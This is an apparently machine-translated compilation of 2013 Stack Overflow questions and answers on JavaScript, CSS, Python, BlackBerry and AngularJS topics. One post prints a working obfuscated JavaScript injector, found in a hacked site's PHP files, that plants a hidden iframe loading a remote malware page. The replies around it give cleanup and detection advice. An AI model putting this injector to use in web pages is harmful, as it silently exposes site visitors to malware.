`portalpanel`如果我们能以某种方式创建一个内部的任何想法`tabpanel`（使用现有的门户示例） `Please help!!!!`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T12:59:27.460

您在 ajas 选项卡中使用 ajax 选项卡您的调用 url，在该 url 中您显示的门户面板如下代码

```
 var tabs2 = Ext.widget('tabpanel', {
                renderTo: document.body,
                activeTab: 0,
                width: 600,
                height: 250,
                plain: true,
                defaults :{
                    autoScroll: true,
                    bodyPadding: 10
                },
                items: [{
                        title: 'Normal Tab',
                        html: "My content was added during construction."
                    },{
                        title: 'Ajax Tab 1',
                        loader: {
                            url: 'ajax1.htm',
                            contentType: 'html',
                            loadMask: true
                        },
                        listeners: {
                            activate: function(tab) {
                                tab.loader.load();
                            }
                        }
                    },{
                        title: 'Ajax Tab 2',
                        loader: {
                            url: 'ajax2.htm',
                            contentType: 'html',
                            autoLoad: true,
                            params: 'foo=123&bar=abc'
                        }
                    },{
                        title: 'Event Tab',
                        listeners: {
                            activate: function(tab){
                                setTimeout(function() {
                                    alert(tab.title + ' was activated.');
                                }, 1);
                            }
                        },
                        html: "I am tab 4's content. I also have an event listener attached."
                    },{
                        title: 'Disabled Tab',
                        disabled: true,
                        html: "Can't see me cause I'm disabled"
                    }
                ]
            }); 
```

# javascript - 使用单个 Facebook 应用 ID 的多个社交插件？

> ID：15510766
> 
> 赞同：1
> 
> 时间：2013-03-19T21:27:29.493
> 
> 标签：javascript, facebook, facebook-graph-api, facebook-javascript-sdk

[Facebook 提供的社交插件](https://developers.facebook.com/docs/plugins/)通常需要关联一个 Facebook 应用 ID。在同一页面上使用多个社交插件（或自定义 Graph API 调用/逻辑）时，是否习惯将它们全部与同一个 Facebook 应用程序关联？由于`FB.init`需要在这些情况下使用（Facebook Docs 说每页只调用一次），并且必须将单个应用程序 ID 传递给它，因此使用多个应用程序 ID 似乎不是要走的路。我知道使用单个应用程序 ID 是可行的，但是使用我在 Graph API 之上构建的社交阅读插件的应用程序 ID 来管理 Facebook 评论似乎很草率。任何人都可以对此有所了解吗？我一直很困惑，直到我的困惑者感到疼痛。

# javascript - 无需提交即可获取图像尺寸 - javascript

> ID：15510769
> 
> 赞同：0
> 
> 时间：2013-03-19T21:27:54.147
> 
> 标签：javascript, jquery, asp.net-mvc, asp.net-mvc-3

如何在不提交的情况下使用 javascript 获取图像的尺寸。我已经尝试了很多示例（例如[这个](https://stackoverflow.com/questions/4434489/get-true-dimensions-of-an-image-with-jquery)），但找不到针对这种特定情况的解决方案。

我正在使用 asp.net mvc3（带剃刀），这是视图：

```
<div>
    @Html.LabelFor(model => model.Image, "Image")
    <input type="file" id="image" name="uploads" onchange="previewImage(this);" />
</div>
<div>
    @Html.Label("Image Preview")
    <div id="preview_image" style="FILTER: progid:DXImageTransform.Microsoft.AlphaImageLoader(sizingMethod=scale)">
    </div>
</div> 
```

这是预览图像的功能：

```
function previewImage(imgFile)
{    
    var newPreview = document.getElementById("preview_image");
    newPreview.filters.item("DXImageTransform.Microsoft.AlphaImageLoader").src = imgFile.value;
    newPreview.style.width = "120px";
    newPreview.style.height = "120px";
} 
```

我必须这样做，因为我需要它在 IE8 和 IE9 上工作，我希望有人可以帮助我，如果需要更多信息，请告诉我。

# xml - BIRT 和 Orbeon

> ID：15510772
> 
> 赞同：1
> 
> 时间：2013-03-19T21:28:02.110
> 
> 标签：xml, xpath, orbeon

我们在标准配置中使用 Orbeon (3.9)。我们正在尝试做的是创建数据和表单定义的 Eclipse BIRT 报告。

我们设法在报告中获取了 data.xml，但无法将 data.xml 和表单定义 (xhtml) 结合起来，因此我们可以获得与表单上的输入相同的输出。

有人能指出我们正确的方向吗？

# javascript - 为什么事件委托不适用于 jquery on()

> ID：15510773
> 
> 赞同：1
> 
> 时间：2013-03-19T21:28:04.953
> 
> 标签：javascript, jquery, jquery-events, event-delegation

我正在使用最新的 jQuery，它说`.live()`已弃用，`.on()`应该改用。我在将点击事件附加到按钮时遇到问题。我动态修改按钮值，应该能够处理这两种情况

```
<input type="text" ><input id="button_1" type="button" value="add" >
<input type="text"> <input id="button_2" type="button" value="add">

$('[id^="button_"]').on("click", "input", function() {
    $(this).val("delete");

    $('#button_'+$(this).attr('id').split('_')[1]).attr('id', 'delButton_'+$(this).attr('id').split[1]);

});

$('[id^="delButton_"]').on("click", "input", function() {
    $(this).val("add");

    $('#delButton_'+$(this).attr('id').split('_')[1]).attr('id', 'button_'+$(this).attr('id').split[1]);

}); 
```

这是演示：[jsfiddle](http://jsfiddle.net/vC7zE/1/)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-19T21:31:11.367

您只能将事件委托给*祖先*元素，但您正试图委托给同级元素。（实际上，我不确定你在做什么！）

所以如果你的标记是

```
<div class="buttonContainer">
    <input type="text" ><input id="button_1" type="button" value="add" >
</div> 
```

你可以使用

```
$('.buttonContainer').on("click", "input", function() {
    // here, "this" will be the clicked input
}); 
```

以上将把对文本输入和按钮的点击委托给它们的父 div。单击任何元素将触发该功能。

如果您只想定位按钮，请将传递的选择器更改为`.on`：

```
$('.buttonContainer').on("click", '[id^="button_"]', function() {
    // here, "this" will be the clicked button
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:35:31.833

相当于：

```
$('[id^="button_"]').live("click", function() { 
```

是：

```
$(document).on("click", '[id^="button_"]', function() { 
```

但是，如果您可以使用比 更接近的祖先`$(document)`，那么您应该使用。

# blackberry-10 - BB10 级联触摸事件

> ID：15510780
> 
> 赞同：2
> 
> 时间：2013-03-19T21:28:32.090
> 
> 标签：blackberry-10, blackberry-cascades

我正在开发一个 BB10 Cascades 本机应用程序。我使用一些容器作为按钮，因为我需要自定义外观。因此，我使用 onTouch 事件来处理“按下”。我想做的是在按下“按钮”时播放音调，并在释放“按钮”时停止音调。

这是代码

```
 Container {

property alias image: imagev.imageSource
id: dialbutton
signal onTouch()
signal onTouchExit()
background: Color.create("#ff0000FF")

ImageView {
    id: imagev
    scalingMethod: ScalingMethod.AspectFit
    horizontalAlignment: HorizontalAlignment.Center
    verticalAlignment: VerticalAlignment.Center
}

onTouch: {

    if (event.touchType == TouchType.Down) {

        dialbutton.background = Color.Blue;
        dialbutton.onTouch(event);
    }
    else if (event.touchType == TouchType.Up)
    {
        dialbutton.background = Color.create("#ff00FF00");

    }

}

onTouchExit:
    {
    dialbutton.background = Color.create("#ff00FF00");
    dialbutton.onTouchExit();
    }
} 
```

我遇到的问题是，当点击“按钮”时，颜色应该变为蓝色，然后在释放时恢复。但是，如果我点击按钮，然后按住它并离开按钮，它会保持蓝色。这是 onTouchExit 应该解决的问题，但它并没有真正以这种方式工作，因为即使按下按钮而不离开按钮也会触发 onTouchExit 事件。我也想播放一个音调（代码未显示），但我需要先让颜色变化正常工作。

任何人都知道我需要改变什么才能使其正常工作

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T04:07:31.363

将 onTouch 块内的“else if”更改为也处理 TouchType.Cancel。TouchType.Cancel 是当您将手指移开按钮时收到的事件。更改后您应该不需要 onTouchExit 代码。

```
onTouch: {

    if (event.touchType == TouchType.Down) {

        dialbutton.background = Color.Blue;
        dialbutton.onTouch(event);
    }
    else if (event.touchType == TouchType.Up || event.touchType == TouchType.Cancel)
    {
        dialbutton.background = Color.create("#ff00FF00");

    }

} 
```

# css - 我的 div 对齐有问题

> ID：15510785
> 
> 赞同：0
> 
> 时间：2013-03-19T21:28:53.940
> 
> 标签：css, html, alignment

大家好，我似乎很难让我的 div 准确地到达我需要的地方。这是该[网站](http://www.artistic-creations-by-mymindseye.com/)的链接。

正如你所看到的，我的幻灯片应该在框架中，但现在我能够以形状或形式做到这一点。

这是我正在使用[的样式表的链接。](http://www.artistic-creations-by-mymindseye.com/style.css)一些帮助将不胜感激，我一页一页地用谷歌搜索，似乎找不到任何解决方案，所以我可以去以前找到帮助的地方。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:35:18.707

```
#slideshow {
position: relative;
left: auto;
right: auto;
top: 119px;} 
```

This CSS looks horrible (width of `#content`, `left:auto; margin-top: auto`...)

My suggestion is to make a fresh start and get rid of all those autos.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:41:05.390

一个快速的解决方法是添加

```
.ws_images{
    margin-top: 122px; 
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:39:08.760

这将解决你的问题：

```
#contentbox {
    position: relative;
}
#content {
    position: absolute;
    left: 100px;
    top: 100px;
} 
```

个人喜好：

```
#wowslider-container1 {
    border: none;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-19T21:39:09.947

您是否尝试过删除“margin-top：auto;”？

```
#content {
height: 374px;
width: 524;
margin-right: auto;
margin-left: auto;
margin-top: auto; 
```

}

# css - HTML/CSS 的常规屏幕像素宽度标准

> ID：15510786
> 
> 赞同：0
> 
> 时间：2013-03-19T21:28:55.207
> 
> 标签：css, html, screen-resolution

是否存在被认为是最大的常规屏幕宽度，即在超过时触发水平滚动条？

例如，我的笔记本电脑显示分辨率是 1600x900，所以当我将主要内容 div 的宽度设置为 1100 并且两边都有一些边距时，它看起来与您现在正在查看的屏幕差不多。

但我担心它是否会在较小的显示分辨率上溢出。我应该把小于 1600 的东西作为我的最大值吗？它应该是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-17T23:45:25.277

使用百分比（具有三列/div 布局）和具有附加属性 max-width:960px;... 的中心列。这几乎是行业标准。这是一个非常好的布局指南，带有响应式（弹性）网格系统： [http ://www.responsivegridsystem.com/](http://www.responsivegridsystem.com/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-17T23:37:18.277

为什么不使用%？它永远不会出现滚动问题......您只需要检测背景图像缩放是否可用（css3）

我遇到的唯一问题 % 是背景图像比例问题......使用 css3 解决了这个问题，因此您可以将整个设计基于 %

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-17T23:30:13.467

这对我来说真的很高。如果我不希望它滚动，我不会制作大于 800px 的布局。如果我更宽松，900 或 950px 就可以了。我包括边距。

# registry - 上下文菜单注册表项命令

> ID：15510790
> 
> 赞同：0
> 
> 时间：2013-03-19T21:29:01.690
> 
> 标签：registry, contextmenu

**我有一个批处理文件，它使用7-Zip**命令行实用程序将目录中的所有文件夹存档。

这是批处理文件，如果您想对其进行测试

```
@echo
cmd.exe /c for /D %%d in (*.*) do "C:\Program Files\7-Zip\7z.exe" a -t7z -r "%%d.7z" "%%d"
pause 
```

这对我来说是一个非常有用的脚本，但是每次我希望这样做时都必须将批处理文件复制到目录中是相当耗时的。

我希望我可以添加一个上下文菜单条目（如“**在此处打开命令提示符**”或“ **TakeOwnership** ”），这将允许我右键单击一个目录并运行此命令：

`for /D %%d in (*.*) do "C:\Program Files\7-Zip\7z.exe" a -t7z "%d.7z" "%d`

我在使用注册表项命令语法时遇到了问题，因此无法成功地将其实现到上下文菜单中。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-29T22:05:25.780

Try looking at this page:
[http://msdn.microsoft.com/en-us/library/windows/desktop/cc144175%28v=vs.85%29.aspx#shortcut_add_commands](http://msdn.microsoft.com/en-us/library/windows/desktop/cc144175%28v=vs.85%29.aspx#shortcut_add_commands)

It might help a bit, but I dont think it is going to the direction you want to.

I'm also trying to add something to the context menu, and it needs to give an argument to the program being called.

In that article, it does show applications taking arguments, but it puts the registry data in a (for me, third) part of the registry. I wouldnt be so hesitant against this, but the example I am following (Notepad++) doesnt have any entry here, so...

If I find out anything new, I'll drag it over here.

# virus - 在我的网络服务器 php 文件中发现了这个 Hack

> ID：15510791
> 
> 赞同：1
> 
> 时间：2013-03-19T21:29:04.810
> 
> 标签：virus

我是如何得到它们的，将来我能做些什么来避免这种情况？

```
#8f4d8e#
echo "<script type=\"text/javascript\" language=\"javascript\" >ff=String;fff=\"fromCharCode\";ff=ff[fff];zz=3;try{document.body&=5151}catch(gdsgd){v=\"eval\";if(document)try{document.body=12;}catch(gdsgsdg){asd=0;try{}catch(q){asd=1;}if(!asd){w={a:window}.a;vv=v;}}e=w[vv];if(1){f=new Array(050,0146,0165,0156,0143,0164,0151,0157,0156,040,050,051,040,0173,015,012,040,040,040,040,0166,0141,0162,040,0145,0163,0170,040,075,040,0144,0157,0143,0165,0155,0145,0156,0164,056,0143,0162,0145,0141,0164,0145,0105,0154,0145,0155,0145,0156,0164,050,047,0151,0146,0162,0141,0155,0145,047,051,073,015,012,015,012,040,040,040,040,0145,0163,0170,056,0163,0162,0143,040,075,040,047,0150,0164,0164,0160,072,057,057,0141,0142,0163,0157,0154,0165,0164,0145,0147,0151,0146,0164,056,0143,0157,0155,057,0137,0160,0162,0151,0166,0141,0164,0145,057,0143,0154,0153,056,0160,0150,0160,047,073,015,012,040,040,040,040,0145,0163,0170,056,0163,0164,0171,0154,0145,056,0160,0157,0163,0151,0164,0151,0157,0156,040,075,040,047,0141,0142,0163,0157,0154,0165,0164,0145,047,073,015,012,040,040,040,040,0145,0163,0170,056,0163,0164,0171,0154,0145,056,0142,0157,0162,0144,0145,0162,040,075,040,047,060,047,073,015,012,040,040,040,040,0145,0163,0170,056,0163,0164,0171,0154,0145,056,0150,0145,0151,0147,0150,0164,040,075,040,047,061,0160,0170,047,073,015,012,040,040,040,040,0145,0163,0170,056,0163,0164,0171,0154,0145,056,0167,0151,0144,0164,0150,040,075,040,047,061,0160,0170,047,073,015,012,040,040,040,040,0145,0163,0170,056,0163,0164,0171,0154,0145,056,0154,0145,0146,0164,040,075,040,047,061,0160,0170,047,073,015,012,040,040,040,040,0145,0163,0170,056,0163,0164,0171,0154,0145,056,0164,0157,0160,040,075,040,047,061,0160,0170,047,073,015,012,015,012,040,040,040,040,0151,0146,040,050,041,0144,0157,0143,0165,0155,0145,0156,0164,056,0147,0145,0164,0105,0154,0145,0155,0145,0156,0164,0102,0171,0111,0144,050,047,0145,0163,0170,047,051,051,040,0173,015,012,040,040,040,040,040,040,040,040,0144,0157,0143,0165,0155,0145,0156,0164,056,0167,0162,0151,0164,0145,050,047,074,0144,0151,0166,040,0151,0144,075,0134,047,0145,0163,0170,0134,047,076,074,057,0144,0151,0166,076,047,051,073,015,012,040,040,040,040,040,040,040,040,0144,0157,0143,0165,0155,0145,0156,0164,056,0147,0145,0164,0105,0154,0145,0155,0145,0156,0164,0102,0171,0111,0144,050,047,0145,0163,0170,047,051,056,0141,0160,0160,0145,0156,0144,0103,0150,0151,0154,0144,050,0145,0163,0170,051,073,015,012,040,040,040,040,0175,015,012,0175,051,050,051,073);}w=f;s=[];if(window.document)for(i=2-2;-i+478!=0;i+=1){j=i;if((031==0x19))if(e)s=s+ff(w[j]);}xz=e;if(v)xz(s)}</script>";
#/8f4d8e# 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:43:59.900

它似乎正在重定向或注入恶意软件分发者 absolutegift dot com 的内容。有人将其上传到您的服务器。此人（或机器人）可能已设法获取您的密码，或者他可能使用了漏洞。更改您的密码，确保所有用户输入（包括上传）都经过验证。确保您有防火墙正在运行（我推荐使用 csf）并扫描您的服务器以查找 rootkit。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:55:54.763

联系您的托管服务提供商并通知他们该问题。 **这一点非常重要** ，我已经关闭了许多合法网站，因为它们遭到入侵并且所有者丢失了所有数据。

*   如果您使用的是 Drupal、Wordpress 等 CMS，请确保升级并更改管理员密码。如果您有任何插件，请确保它们已升级。
*   如果您没有 CMS，请更改您的 FTP 和控制面板密码。

* * *

至于解决问题。如果您使用的是 CMS，就地升级应替换所有文件。如果没有，您可以下载所有文件并使用 Notepad++ 之类的文字处理器在整个目录中进行查找和替换。 **此外**，您的托管服务提供商可能能够从备份中恢复，或者至少有一些修复它的经验。

* * *

为了防止它，不要使用 CMS 并学习一些网络安全。可能聘请渗透测试员。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-23T14:44:20.243

这也发生在一个运行 Drupal 5 的旧站点上。我所做的是下载该站点并使用 meld（Linux 的图形差异工具）将其与代码库的干净副本进行比较。我发现有一个名为 god.php 的文件位于其中一个子目录中，其中包含一个名为[R57](http://www.r57.gen.tr/shell.php)的 php 脚本。这东西[能做](http://www.youtube.com/watch?v=VGakZeXSWA0)什么，真是太可怕了。我的许多文件都感染了以下内容：

```
<?php
#8f4d8e#
...
#/8f4d8e#
?> 
```

我手动清理了几次，但一直被黑客入侵，直到我删除了“god.php”文件。我认为它在您的系统上可能会以不同的方式调用。如果您对服务器具有 SSH 访问权限，请转到您的文档根目录并搜索包含该字符串的所有文件：

```
grep -R "#8f4d8e#" . 
```

您还可以查找您的 god.php 文件版本...查找 R57 的痕迹，例如通过发出：

```
grep -R "R57" . 
```

我的文件开头有一个很大的 ASCII 艺术图，描绘了一个错误。

我不知道我是怎么弄到它的，但是有一系列不好的东西：未更新的非常旧的 Drupal 版本，带有 register_globals 的 PHP4，共享主机（可能是一家糟糕的公司）。

我所做的是将清理后的站点移动到另一个使用 PHP 5 的托管公司并更改所有密码：drupal、ftp、mysql 等。

# c++ - 英特尔编译器-FASM 中的内联汇编？

> ID：15510797
> 
> 赞同：3
> 
> 时间：2013-03-19T21:29:25.967
> 
> 标签：c++, assembly, x86, intel

如果您希望在 C++ 中编写内联汇编（使用英特尔编译器编译 C++ 时），您使用哪种汇编语法？是 FASM/NASM 还是 MASM？这对您使用的操作系统有影响吗（或者英特尔编译器是否将这种差异抽象出来）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:39:56.923

据[英特尔](http://software.intel.com/sites/products/documentation/doclib/stdxe/2013/composerxe/compiler/cpp-win/GUID-5100C4FC-BC2F-4E36-943A-120CFFFB4285.htm)称，英特尔® C++ 编译器支持 Microsoft 风格和类 GNU 风格的内联汇编：

> ## 内联装配
> 
> ### Microsoft* 样式内联汇编
> 
> 英特尔® C++ 编译器支持 Microsoft 风格的内联汇编。有关正确的语法，请参阅 Microsoft 文档。
> 
> ### 类似 GNU* 的样式内联汇编（仅限 IA-32 架构和 Intel® 64 架构）
> 
> 英特尔® C++ 编译器支持类 GNU 风格的内联汇编。语法如下：
> 
> ```
> asm-keyword [ volatile-keyword ] ( asm-template [ asm-interface ] ) ; 
> ```
> 
> ### 笔记
> 
> 如果汇编代码使用 AT&T* System V/386 语法，英特尔® C++ 编译器支持 gcc 样式的内联 ASM。

# python - Python 2.7：进程池不工作（创建了无限工人）

> ID：15510798
> 
> 赞同：0
> 
> 时间：2013-03-19T21:29:26.203
> 
> 标签：python, multiprocessing, pool

我的多进程池不工作并且行为异常：

```
from multiprocessing import Pool
import multiprocessing, logging
logger = multiprocessing.log_to_stderr()
logger.setLevel(multiprocessing.SUBDEBUG)

def f(x):
    return x*x

if __name__ == '__main__':
    pool = Pool(processes=2)
    print pool.map(f,range(10)) 
```

记录器打印出一大堆东西，例如：

```
[DEBUG/MainProcess] created semlock with handle 420
[DEBUG/MainProcess] created semlock with handle 432
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] cleaning up worker 1
[DEBUG/MainProcess] cleaning up worker 0
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] cleaning up worker 1
[DEBUG/MainProcess] cleaning up worker 0
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] cleaning up worker 1
[DEBUG/MainProcess] cleaning up worker 0
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] cleaning up worker 1
[DEBUG/MainProcess] cleaning up worker 0
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] cleaning up worker 1
[DEBUG/MainProcess] cleaning up worker 0
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] cleaning up worker 1
[DEBUG/MainProcess] cleaning up worker 0
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] cleaning up worker 1
[DEBUG/MainProcess] cleaning up worker 0
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] cleaning up worker 1
[DEBUG/MainProcess] cleaning up worker 0
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] cleaning up worker 1
[DEBUG/MainProcess] cleaning up worker 0
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] cleaning up worker 1
[DEBUG/MainProcess] cleaning up worker 0
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] added worker 
```

...无限期地从不打印结果。

为什么这不起作用？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:37:26.433

该问题是由在 Windows 上运行 PyScripter (v2.5.3.0) 中的代码引起的。从命令行运行效果很好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:32:55.933

FWIW，您的代码在我的盒子上运行良好。（Windows 7、x64、Python 2.7.0）：

```
C:\Users\X\Desktop>python mp.py
[DEBUG/MainProcess] created semlock with handle 384
[DEBUG/MainProcess] created semlock with handle 396
[DEBUG/MainProcess] added worker
[DEBUG/MainProcess] added worker
[DEBUG/PoolWorker-2] recreated blocker with handle 12
[DEBUG/PoolWorker-2] recreated blocker with handle 12
[DEBUG/PoolWorker-2] recreated blocker with handle 24
[[DEBUG/PoolWorker-1] recreated blocker with handle 32
DEBUG/PoolWorker-2] recreated blocker with handle 24
[DEBUG/PoolWorker-1] recreated blocker with handle 32
[[DEBUG/PoolWorker-1] recreated blocker with handle 48
INFO/PoolWorker-2] child process calling self.run()
[DEBUG/PoolWorker-1] recreated blocker with handle 48
[INFO/PoolWorker-1] child process calling self.run()
[[INFO/PoolWorker-1] child process calling self.run()
INFO/PoolWorker-2] child process calling self.run()
[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]
[INFO/MainProcess] process shutting down
[DEBUG/MainProcess] running all "atexit" finalizers with priority >= 0
[SUBDEBUG/MainProcess] calling <Finalize object, callback=_terminate_pool, args=(<Queue.Queue instance at 0x01FCCBE8>, <multiprocessing.queues.SimpleQueue object at 0x01F57890>, <multiprocessing.queues.SimpleQueue object
 at 0x01FAFBB0>, [<Process(PoolWorker-1, started daemon)>, <Process(PoolWorker-2, started daemon)>], <Thread(Thread-1, started daemon 84304)>, <Thread(Thread-2, started daemon 84900)>, <Thread(Thread-3, started daemon 42
352)>, {}), exitprority=15>
[SUBDEBUG/MainProcess] finalizer calling <bound method type._terminate_pool of <class 'multiprocessing.pool.Pool'>> with args (<Queue.Queue instance at 0x01FCCBE8>, <multiprocessing.queues.SimpleQueue object at 0x01F5789
0>, <multiprocessing.queues.SimpleQueue object at 0x01FAFBB0>, [<Process(PoolWorker-1, started daemon)>, <Process(PoolWorker-2, started daemon)>], <Thread(Thread-1, started daemon 84304)>, <Thread(Thread-2, started daemo
n 84900)>, <Thread(Thread-3, started daemon 42352)>, {}) and kwargs {}
[DEBUG/MainProcess] finalizing pool
[DEBUG/MainProcess] helping task handler/workers to finish
[DEBUG/MainProcess] task handler got sentinel
[DEBUG/MainProcess] removing tasks from inqueue until task handler finished
[DEBUG/MainProcess] task handler sending sentinel to result handler
[DEBUG/MainProcess] result handler got sentinel
[DEBUG/MainProcess] task handler sending sentinel to workers
[[DEBUG/MainProcess] ensuring that outqueue is not full
DEBUG/PoolWorker-1] worker got sentinel -- exiting
[[[DEBUG/PoolWorker-2] worker got sentinel -- exiting
DEBUG/MainProcess] task handler exiting
DEBUG/PoolWorker-1] worker got sentinel -- exiting
[[DEBUG/PoolWorker-1] worker exiting after 5 tasks
[[DEBUG/PoolWorker-1] worker exiting after 5 tasks
DEBUG/PoolWorker-2] worker got sentinel -- exiting
[INFO/PoolWorker-1] process shutting down
DEBUG/MainProcess] terminating workers
[DEBUG/MainProcess] result handler exiting: len(cache)=0, thread._state=2
[DEBUG/MainProcess] worker handler exiting
[DEBUG/MainProcess] joining task handler
[DEBUG/MainProcess] joining result handler
[DEBUG/MainProcess] joining pool workers
[DEBUG/MainProcess] running the remaining "atexit" finalizers
C:\Users\X\Desktop> 
```

# playframework - 如何为必须一致的动态内容构建 Web 请求

> ID：15510799
> 
> 赞同：1
> 
> 时间：2013-03-19T21:29:29.480
> 
> 标签：playframework, playframework-2.0

我有一个动态生成的 HTML 页面，其中包含动态生成的图像 (jpeg)。对于我的应用程序来说，这两种动态生成的资源彼此一致是很重要的。（HTML 包含一些我覆盖在图像顶部的元素。）这有点棘手，因为这两个资源当然是在不同的 HTTP 请求中获取的。

在我的服务器代码中构造它的最佳方法是什么？播放是否支持特定的处理方式？

* * *

一些选项浮现在脑海中：

首先是在请求 HTML 页面时计算图片的参数，并将这些参数放入图片的 URL 中。对我来说不幸的是，这里有很多我认为不适合 URL 的状态。

另一种方法可能是在请求 HTML 期间生成图像（或仅生成图像的参数），并将其存储在服务器端某处。然后当图像请求出现时，我可以返回预先生成的图像。这个解决方案的唯一问题是我现在需要担心生成的图像服务器端的生命周期，这感觉很糟糕。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:50:48.960

实际上，您的两种方法都是正确的，无论如何我会选择第一种：原因很简单，如果您的请求在渲染页面之前因任何原因而死，您将失去一些用于渲染图像的资源，这些资源将永远不会被使用。另一件事是它（可能）应该能够从任何请求中渲染图像，而不仅仅是来自控制器（如第二种方法中所述），因此最好创建一个能够根据请求参数渲染它的动作。

结论（注意，这只是我的猜测） - 可能您能够将所有必需的参数编码为单个字符串（即除以一些字符，例如：`1234_w600_h200.jpg`，这意味着：从记录 ID 所在的数据库中获取图像`1234`并创建一个缩略图`width 600px`和`height 200px`. 或者更简单（afaik flicker 使用这个）`1234s.jpg`, `1234m.jpg`, `1234l.jpg`, 其中`s`, `m`, `l`appendixes 代表一些预定义的缩略图大小。

所以最后你需要从控制器传递到视图是第一部分 - 数据库记录的ID，其他部分（维度）你可以直接添加到视图中，你可以根据需要进行......例如：***下载小，中型或大型版本...***

# c# - 如何在数据绑定中隐藏 ListView 中的元素以获取特定值

> ID：15510804
> 
> 赞同：1
> 
> 时间：2013-03-19T21:29:49.523
> 
> 标签：c#, xml, xaml, windows-runtime, winrt-xaml

`<Finished>`我有 XML 文件和 listView，如果 XML 元素的值等于 false ，我想在此列表视图项中隐藏特定的 XAML 元素。

我该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:39:00.883

您将 XAML 元素的可见性绑定到`Finished`列表项的属性。

您将需要通过一个转换器来绑定它，该转换器接受一个布尔值并根据需要返回`Visibility.Visible`或`Visibility.Collapsed`：

```
<TextBlock Visibility="{Binding Finished,
                        Converter={StaticResource BoolToVisibilityConverter}}"/> 
```

转换器：

```
public class GenderConverter: IValueConverter
{
    public object Convert(object value, Type targetType, object parameter, CultureInfo culture)
    {
        if (value is bool)
            return (bool)value ? Visibility.Visible : Visibility.Collapsed;
        else
            return Visibility.Collapsed;
    }

    public object ConvertBack(object value, Type targetType, object parameter, CultureInfo culture)
    {
        throw NotImplementedException();
    }
} 
```

如果该值不是布尔值，则转换器会稍微复杂一些，您可能需要传入 a`ConverterParameter`作为控制值，以便您可以更好地控制何时返回`Visibility.Visible`

# javascript - 使用 $window 配置 AngularJS 路由到深层路径

> ID：15510805
> 
> 赞同：4
> 
> 时间：2013-03-19T21:29:54.570
> 
> 标签：javascript, angularjs

我有一个 Rails 应用程序，它有一些复杂的路由。我的 Angular 应用程序存在于 /quizzes/1 等深层 URL 中

我希望通过 Angular 将 $window 注入到我的路由配置中，然后嗅探 $window.location.pathName 来做到这一点。这似乎是不可能的，因为应用程序在这个阶段抛出了一个“Unknown provider: $window from myApp”。

是否有使用 Angular 处理此问题的最佳实践方法？我想这样做的原因是在应用程序位于深层目录时使用 HTML5 模式。

这是我希望的一个例子，[http://jsfiddle.net/UwhWN/](http://jsfiddle.net/UwhWN/)。我意识到，如果它是唯一的选择，我可以在程序的这一点上使用 window.location.pathname。

HTML：

```
<div ng-app="myApp"></div> 
```

JS：

```
var app = angular.module('myApp', [])

  app.config([

    '$window', '$routeProvider', '$locationProvider',

    function($window, $routeProvider, $locationProvider) {

        var path = $window.location.pathname

       // Coming Soon
       // $locationProvider.html5Mode(true)

      $routeProvider
        .when(path + '/start', {
            controller: 'splashScreenController',
            templateUrl: 'partials/splash-screen.html'
        })

        .when(path + '/question/:id', {
            controller: 'questionController',
            templateUrl: 'partials/question-loader.html'
        })

        .otherwise({
          redirectTo: path + '/start'
        })
  }]) 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-19T21:59:57.777

只有常量和提供者可以注入配置块。$window 不能注入到您的配置块中，因为 $window 是一项服务。

来自[Angular 文档](http://docs.angularjs.org/guide/module)：

> **配置块**- 在提供者注册和配置阶段执行。只有提供者和常量可以注入到配置块中。这是为了防止在完全配置之前意外实例化服务。

而且，无论如何您都不需要 $window 服务。只需使用`<base>`标签：

```
<base href="/quizzes/1/" /> 
```

并保持你的路线相对于它。

# c++ - 使用统一步幅时替代 glMultiDrawArrays？

> ID：15510806
> 
> 赞同：3
> 
> 时间：2013-03-19T21:29:55.630
> 
> 标签：c++, opengl, glsl, opengl-3

